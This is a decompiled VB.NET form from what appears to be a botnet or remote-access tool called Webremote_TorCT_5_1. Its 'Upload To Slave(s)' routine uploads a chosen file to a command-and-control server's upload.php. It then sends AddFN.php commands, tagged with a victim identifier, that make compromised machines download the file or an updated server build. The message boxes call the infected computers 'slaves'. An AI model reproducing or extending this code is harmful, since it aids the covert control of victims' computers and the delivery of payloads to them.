Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Webremote_TorCT_5_1.My

Namespace Webremote_TorCT_5_1
    <DesignerGenerated> _
    Public Class UploadFileTo
        Inherits Form
        ' Methods
        Public Sub New()
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.UploadFileTo_Load)
            Dim list As List(Of WeakReference) = UploadFileTo.__ENCList
            SyncLock list
                UploadFileTo.__ENCList.Add(New WeakReference(Me))
            End SyncLock
            Me.Webuploader = New WebClient
            Me.SendCommand = New WebClient
            Me.filename = ""
            Me.Upateserver = 0
            Me.InitializeComponent
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.OpenFileDialog1.ShowDialog = DialogResult.OK) Then
                Me.TextBox1.Text = Me.OpenFileDialog1.FileName
                Me.filename = Path.GetFileName(Me.TextBox1.Text)
                Me.Button2.Enabled = True
            End If
        End Sub

        Private Sub Button2_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.TextBox1.Text = "") Then
                Interaction.MsgBox("Couldn't upload file", MsgBoxStyle.ApplicationModal, Nothing)
            Else
                Try 
                    Interaction.MsgBox("This can take some time", MsgBoxStyle.ApplicationModal, Nothing)
                    Me.Webuploader.UploadFile((MyProject.Forms.Client.HostName.ToString & "/upload.php"), Me.TextBox1.Text)
                    Interaction.MsgBox("File Uploaded! We will now let the slaves download it!", MsgBoxStyle.ApplicationModal, Nothing)
                    If (Me.Upateserver = 1) Then
                        Me.SendCommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/AddFN.php?Function=DownloadFIleToComputer7472:" & Me.filename & MyProject.Forms.Client.Strvictem.ToString))
                    Else
                        Me.SendCommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/AddFN.php?Function=DownloadFIleToComputer747:" & Me.filename & MyProject.Forms.Client.Strvictem.ToString))
                    End If
                    Interaction.MsgBox("Sended to slaves!", MsgBoxStyle.ApplicationModal, Nothing)
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    Interaction.MsgBox("Couldn't upload file", MsgBoxStyle.ApplicationModal, Nothing)
                    ProjectData.ClearProjectError
                End Try
            End If
            Me.Upateserver = 0
            Me.Close
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.components Is Nothing)) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(UploadFileTo))
            Me.OpenFileDialog1 = New OpenFileDialog
            Me.TextBox1 = New TextBox
            Me.Button2 = New Button
            Me.Button1 = New Button
            Me.SuspendLayout
            Me.OpenFileDialog1.FileName = "OpenFileDialog1"
            Dim point As New Point(12, 9)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            Dim size As New Size(&HD4, 20)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 11
            point = New Point(12, &H23)
            Me.Button2.Location = point
            Me.Button2.Name = "Button2"
            size = New Size(370, &H2F)
            Me.Button2.Size = size
            Me.Button2.TabIndex = 10
            Me.Button2.Text = "Upload To Slave(s)" & ChrW(13) & ChrW(10)
            Me.Button2.UseVisualStyleBackColor = True
            point = New Point(230, 5)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            size = New Size(&H98, &H1A)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 9
            Me.Button1.Text = "Browse File"
            Me.Button1.UseVisualStyleBackColor = True
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H185, &H58)
            Me.ClientSize = size
            Me.Controls.Add(Me.TextBox1)
            Me.Controls.Add(Me.Button2)
            Me.Controls.Add(Me.Button1)
            Me.FormBorderStyle = FormBorderStyle.FixedSingle
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "UploadFileTo"
            Me.Text = "UploadFileTo"
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub UploadFileTo_Load(ByVal sender As Object, ByVal e As EventArgs)
            Me.Button2.Enabled = False
            If (Me.Upateserver = 1) Then
                Me.Button2.Text = "Upload New Server"
            End If
        End Sub


        ' Properties
        Friend Overridable Property Button1 As Button
            <DebuggerNonUserCode> _
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = WithEventsValue
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Button2 As Button
            <DebuggerNonUserCode> _
            Get
                Return Me._Button2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button2_Click)
                If (Not Me._Button2 Is Nothing) Then
                    RemoveHandler Me._Button2.Click, handler
                End If
                Me._Button2 = WithEventsValue
                If (Not Me._Button2 Is Nothing) Then
                    AddHandler Me._Button2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OpenFileDialog1 As OpenFileDialog
            <DebuggerNonUserCode> _
            Get
                Return Me._OpenFileDialog1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As OpenFileDialog)
                Me._OpenFileDialog1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Me._TextBox1 = WithEventsValue
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("Button2")> _
        Private _Button2 As Button
        <AccessedThroughProperty("OpenFileDialog1")> _
        Private _OpenFileDialog1 As OpenFileDialog
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        Private components As IContainer
        Private filename As String
        Private SendCommand As WebClient
        Public Upateserver As Integer
        Private Webuploader As WebClient
    End Class
End Namespace

